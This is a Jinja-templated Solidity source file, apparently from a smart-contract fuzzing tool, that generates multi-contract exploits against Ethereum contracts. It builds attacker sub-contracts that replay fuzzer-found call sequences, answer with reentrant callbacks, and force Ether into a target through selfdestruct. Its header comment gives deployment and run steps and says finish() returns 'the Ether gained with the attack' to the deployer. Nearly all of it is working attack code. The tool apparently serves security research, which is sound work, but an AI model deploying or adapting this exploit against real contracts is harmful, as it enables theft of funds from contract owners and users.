/*
 * Multi-Attacker Exploit Generated by EF/CF Attack Contract Synthesizer
 *
 * Deploy the `Attack` contract with the target addresses as the constructor
 * parameter. Make sure to send at least {{required_budget|wei_to_ether}} to the attack
 * contract along with the constructor. Make sure that the ordering of the
 * target addresses array is exactly the same as in the fuzzer. Otherwise the
 * attack will not work!
 *
 * To execute the attack, call the `attack()` method. Calling `attack` might
 * emit the `WaitForBlocks(N)` event. In this case you should call the
 * `attack()` method again after `N` blocks have passed.
 *
 * To start the attack again, you can use `reset(new_target_addrs)` to reset the
 * attack contract.
 *
 * To claim the Ether gained with the attack, issue a call to `finish()`, which
 * will destroy all attack contracts and send all funds back to you.
 *
 * The original test case was executed with the following environment:
 * block number: +{{ header.get_number() }}
 * timestamp: +{{ header.get_timestamp() }}
 * gas limit: {{ header.get_gas_limit() }}
 * difficulty: {{ header.get_difficulty() }}
 * initial balance: {{ header.get_initial_ether()|from_call_value }} wei
 *
 */

pragma solidity ^0.7;

/*****************************************************/
contract ForceSender {
    function send(address payable target) external payable {
        selfdestruct(target);
    }
    receive() external payable {}
}

/*****************************************************/

interface AttackManager {
    function __get_state() external view returns(uint);
    function __get_rstate() external view returns(uint, uint);
    function __set_state(uint _state) external;
    function __set_rstate(uint _state, uint _rstate) external;
    function __id_to_address(uint id) external view returns(address payable);
}

contract AttackDispatcher {

    event CallReturned(uint state, address target, address who, bool success, bytes retdata);
    event InvalidDispatch(uint state, address who, address caller);
    event CallbackReceived(uint state, address who, address caller, uint value, bytes data);
    event Calling(uint state, address target, address from, uint value, bytes data);
    event Returning(uint state, uint rstate, address target, address from, bool success, bytes data);
    event ReturningNone(uint state, uint rstate, address target, address from);

    uint id;
    address payable[] targets;
    AttackManager manager;

    constructor(uint _id, address payable[] memory _targets) payable {
        id = _id;
        manager = AttackManager(msg.sender);
        targets = _targets;
    }

    fallback() external payable {
        _fallback();
    }
    receive() external payable {
        _fallback();
    }

    function _finish() external {
        address to = address(manager);
        require(msg.sender == to);
        selfdestruct(payable(to));
    }

    function _fallback() internal {
        (uint rstate_state, uint rstate) = manager.__get_rstate();
        emit CallbackReceived(rstate_state, address(this), msg.sender, msg.value, msg.data);
        {%- for call in fc.txs %}
        {%- if loop.first %}
        if (rstate_state == {{ loop.index0 }}) {
        {%- else %}
        else if (rstate_state == {{ loop.index0 }}) {
        {%- endif %}
            {%- for ret in call.returns %}
            {%- if loop.first %}
            if (rstate == {{ loop.index0 }}) {
            {%- else %}
            else if (rstate == {{ loop.index0 }}) {
            {%- endif %}
                {%- if ret.header.reenter > 0 %}
                uint cur_state = manager.__get_state();
                {%- if ret.header.reenter == 1 %}
                _dispatch();
                {%- else if ret.header.reenter > 1 %}
                for (uint i = 0; i < {{ ret.header.reenter }}; i++) {
                    _dispatch();
                }
                {%- endif %}
                {%- else %}
                uint cur_state = rstate_state;
                {%- endif %}
                bytes memory retdata = {{ ret.data|to_bytes_addrfixup }};
                uint retdata_len = {{ ret.data.len() }};
                emit Returning(cur_state, rstate, msg.sender, address(this), {{ (ret.header.value > 0) }}, retdata);
                rstate += 1;
                manager.__set_rstate(cur_state, rstate);
                {%- if ret.header.value == 0 %}
                // WARNING: this will probably break the state machine,                
                // because it will revert the __set_rstate call... I don't
                // think it is possible to really deal with it, but also the 
                // fuzzer is unlikely to generate something like this.
                assembly { revert(retdata, retdata_len) }
                {%- else %}
                assembly { return(retdata, retdata_len) }
                {%- endif %}
            }
            {%- endfor %}
        }
        {%- endfor %}

        emit ReturningNone(rstate_state, rstate, msg.sender, address(this));
    }

    function _dispatch() public returns(bool) {
        uint state = manager.__get_state();
        {%- for call in fc.txs %}
        {%- if loop.first %}
        if (state == {{ loop.index0 }}) {
        {%- else %}
        else if (state == {{ loop.index0 }}) {
        {%- endif %}
            if (id == {{ call.header.sender_select }}) {
                {%- if contractinfo.is_some() %}
                /* {{- call.input|abi_format(contractinfo)|indent(14) }} 
                 */
                {%- endif %}
                bytes memory data = {{ call.input|to_bytes_addrfixup }};
                uint value = {{ call.header.get_packed_call_value()|from_call_value }};
                address payable target = payable(targets[{{ call.header.get_receiver_select() }} % targets.length]);
                emit Calling(state, target, address(this), value, data);
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
                emit CallReturned(state, target, address(this), success, retdata);
                state += 1;
                manager.__set_state(state);
                return true;
            } else {
                AttackDispatcher via = AttackDispatcher(manager.__id_to_address({{ call.header.get_sender_select() }}));
                via._dispatch();
            }
        }
        {%- endfor %}
        emit InvalidDispatch(state, address(this), msg.sender);
        return false;
    }
}

contract Attack is AttackManager {

    event WaitForBlocks(uint count);
    event StateReached(uint state);
    event AttackFinished();

    uint constant REQUIRED_BUDGET = {{required_budget|as_hex}}; /* equals {{required_budget|wei_to_ether }} */
    {%- if header.initial_ether > 0 %}
    uint constant INITIAL_ETHER = {{header.get_initial_ether()|from_call_value}};
    {%- endif %}

    uint state = 0;
    uint rstate_state = 0;
    mapping(uint => uint) rstate;
    uint budget = 0;

    address payable owner;
    address payable[] targets;

    mapping (uint => uint) state2sub;
    mapping (uint => uint) state2blockadvance;

    AttackDispatcher[{{ contracts.len() }}] subs;

    function setTargets(address payable[] memory _targets) internal {
        delete targets;
        require(_targets.length > 0);
        for (uint i = 0; i < _targets.length; i++) {
            require(_targets[i] != address(0));
            targets.push(_targets[i]);
        }
    }

    constructor(address payable[] memory _targets) payable {
        owner = payable(msg.sender);
        reset(_targets);

        {%- for call in fc.txs %}
        state2sub[{{ loop.index0 }}] = 1 + {{ call.header.sender_select }};
        {%- let ba = call.header.get_block_advance() %}
        {%- if ba > 0 %}
        /* WARNING: After call in state {{ loop.index0 }}, should advance blockchain state by
         * block number += {{ ba }}
         * timestamp += {{ ba|advance_to_time }}
         *
         * NOTE: Call the `attacker()` function again, after this has passed.
         */
        state2blockadvance[{{ loop.index0 }}] = {{ ba }};
        {%- endif %}
        {%- endfor %}
    }

    modifier onlyOwner {
        require(owner != address(0));
        require(msg.sender == owner);
        _;
    }

    function __get_state() public view override returns(uint) {
        return state;
    }
    function __set_state(uint _state) public override {
        state = _state;
    }
    function __get_rstate() public view override returns(uint, uint) {
        return (rstate_state, rstate[rstate_state]);
    }
    function __set_rstate(uint _state, uint _rstate) public override {
        rstate[_state] = _rstate;
    }
    function __id_to_address(uint id) public view override returns(address payable) {
        return payable(address(subs[id % {{contracts.len()}}]));
    }

    receive() external payable {
        budget += msg.value;
    }

    function _reclaim_subs() internal {
        // delete prior attack subs, extracting funds
        for (uint i = 0; i < {{ contracts.len() }}; i++) {
            if (address(subs[i]) != address(0)) {
                subs[i]._finish();
            }
        }
    }

    function reset(address payable[] memory _targets) public onlyOwner payable {
        _reclaim_subs();

        setTargets(_targets);

        // check budget
        budget = address(this).balance;
        require(budget >= REQUIRED_BUDGET);

        // reset state and sub contracts
        state = 0;
        rstate_state = 0;
        {%- for call in fc.txs %}
        rstate[{{ loop.index0 }}] = 0;
        {%- endfor %}
        
        {%- for c in contracts %}
        {%- if c.calls.len() > 0 %}
        subs[{{ loop.index0 }}] = new AttackDispatcher{value: {{c.budget}} }({{ c.id }}, _targets);
        {%- endif %}
        {%- endfor %}
    }

    function finish() external onlyOwner {
        _reclaim_subs();
        selfdestruct(owner);
    }
    
    function finishTo(address payable to) external onlyOwner {
        _reclaim_subs();
        selfdestruct(to);
    }

    function attack() external onlyOwner payable {
        {%- if header.initial_ether > 0 %}
        if (state == 0) {
            ForceSender f = new ForceSender();
            f.send{value: INITIAL_ETHER}(targets[0]);
        }
        {%- endif %}

        while (state < {{ fc.txs.len() }}) {
            uint sub_id = state2sub[state];
            if (sub_id == 0) { // no sub available for the given state id
                break;
            }
            rstate_state = state;
            emit StateReached(state);
            sub_id -= 1;
            subs[sub_id]._dispatch();

            uint ba = state2blockadvance[state];
            if (ba > 0) {
                emit WaitForBlocks(ba);
                return;
            }
        }

        emit AttackFinished();
    }
}
